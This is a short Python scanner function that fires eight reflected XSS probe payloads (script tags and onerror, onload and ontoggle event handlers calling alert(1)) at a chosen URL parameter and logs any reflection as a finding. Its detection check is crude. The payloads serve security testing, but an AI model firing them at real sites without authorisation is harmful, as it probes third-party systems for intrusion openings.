import requests
import logging
import os
from urllib.parse import quote

# Ensure logs directory exists
os.makedirs('logs', exist_ok=True)

logging.basicConfig(filename='logs/results.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def test_xss(url: str, param: str, method: str = 'POST') -> bool:
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>"
    ]
    for payload in payloads:
        try:
            if method.upper() == 'GET':
                # For GET, append param to URL with URL encoding
                encoded_payload = quote(payload)
                if '?' in url:
                    full_url = f"{url}&{param}={encoded_payload}"
                else:
                    full_url = f"{url}?{param}={encoded_payload}"
                response = requests.get(full_url, timeout=10)
            else:
                # For POST, use data
                data = {param: payload}
                response = requests.post(url, data=data, timeout=10)
            
            # Improved detection: check if payload is reflected and not just in text
            if payload in response.text:
                # Additional check: ensure it's in HTML context (basic)
                if '<' in response.text and '>' in response.text:
                    logging.info(f"XSS vulnerability detected: {payload} in {url} via {method}")
                    print(f"[+] XSS berhasil: {payload}")
                    return True
        except requests.exceptions.RequestException as e:
            logging.error(f"Request error during XSS test: {e}")
            print(f"[!] Request Error: {e}")
        except Exception as e:
            logging.error(f"Unexpected error during XSS test: {e}")
            print(f"[!] Unexpected Error: {e}")
    return False
